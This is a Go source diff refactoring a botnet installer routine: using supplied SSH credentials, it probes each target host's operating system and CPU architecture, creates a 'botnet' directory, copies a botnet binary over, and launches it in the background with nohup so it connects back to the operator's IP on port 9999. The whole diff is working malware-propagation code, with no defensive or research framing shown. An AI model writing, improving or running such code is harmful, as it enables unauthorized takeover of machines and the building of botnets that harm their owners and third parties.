@@ -126,21 +126,14 @@ func (a *Attack) install(c *credential) {
 	defer a.wg.Done()
 	fmt.Println("[*] installing botnet on", c.host)
 
-	sess, err := getSSHSession(c.host, c.username, c.password)
-	if err != nil {
-		fmt.Printf("[ERROR] creating ssh session %v\n", err)
-		return
-	}
-
 	// get the home path
 	fmt.Println("[*] getting home directory")
 	cmd := "pwd"
-	out, err := sess.Output(cmd)
+	out, err := a.executeWithOutput(cmd, c)
 	if err != nil {
 		fmt.Printf("[ERROR] getting home directory %v\n", err)
 		return
 	}
-	sess.Close()
 
 	nodeOS := "linux"
 	if strings.Contains(string(out), "Users") {
@@ -150,18 +143,12 @@ func (a *Attack) install(c *credential) {
 	arch := "amd64"
 	if nodeOS == "linux" {
 		fmt.Println("[*] getting architecture")
-		sess, err := getSSHSession(c.host, c.username, c.password)
-		if err != nil {
-			fmt.Printf("[ERROR] creating ssh session %v\n", err)
-			return
-		}
 		cmd := "cat /proc/cpuinfo | grep 'model name'"
-		out1, err := sess.Output(cmd)
+		out1, err := a.executeWithOutput(cmd, c)
 		if err != nil {
 			fmt.Printf("[ERROR] getting architecture %v\n", err)
 			return
 		}
-		sess.Close()
 
 		if strings.Contains(string(out1), "ARM") {
 			arch = "arm"
@@ -170,19 +157,15 @@ func (a *Attack) install(c *credential) {
 
 	// create the botnet bin path
 	fmt.Println("[*] creating botnet bin dir")
-	sess, err = getSSHSession(c.host, c.username, c.password)
-	if err != nil {
-		fmt.Printf("[ERROR] creating ssh session %v\n", err)
-		return
-	}
 	cmd = fmt.Sprintf("mkdir %s/botnet && mkdir %s/botnet/bin", strings.TrimSpace(string(out)), strings.TrimSpace(string(out)))
-	if err := sess.Start(cmd); err != nil {
+	if err := a.execute(cmd, c); err != nil {
 		fmt.Printf("[ERROR] creating botnet dirs %v\n", err)
 		return
 	}
-	sess.Close()
 
-	sess, err = getSSHSession(c.host, c.username, c.password)
+	// scp over botnet binary
+	fmt.Println("[*] sending botnet binary to remote machine...")
+	sess, err := getSSHSession(c.host, c.username, c.password)
 	if err != nil {
 		fmt.Printf("[ERROR] creating ssh session %v\n", err)
 		return
@@ -199,26 +182,37 @@ func (a *Attack) install(c *credential) {
 	}
 
 	// execute botnet client
-	sess, err = getSSHSession(c.host, c.username, c.password)
-	if err != nil {
-		fmt.Printf("[ERROR] creating ssh session %v\n", err)
-		return
-	}
 	localIP := getLocalIP()
 	cmd = fmt.Sprintf("nohup %s/botnet/bin/botnet -target %s -port 9999 connect > /dev/null 2>&1 &", strings.TrimSpace(string(out)), localIP)
-	if err := a.execute(cmd, sess); err != nil {
+	fmt.Println("[*] starting botnet on remote machine...")
+	if err := a.execute(cmd, c); err != nil {
 		fmt.Printf("[ERROR] executing botnet %v\n", err)
 		return
 	}
 }
 
-func (a *Attack) execute(cmd string, sess *ssh.Session) error {
-	fmt.Println("[*] starting botnet on remote machine...")
+func (a *Attack) execute(cmd string, c *credential) error {
+	sess, err := getSSHSession(c.host, c.username, c.password)
+	if err != nil {
+		return err
+	}
+	defer sess.Close()
+
 	if err := sess.Start(cmd); err != nil {
 		return err
 	}
 
 	return nil
+}
+
+func (a *Attack) executeWithOutput(cmd string, c *credential) ([]byte, error) {
+	sess, err := getSSHSession(c.host, c.username, c.password)
+	if err != nil {
+		return nil, err
+	}
+	defer sess.Close()
+
+	return sess.Output(cmd)
 }
 
 func getContent(file string) ([]string, error) {
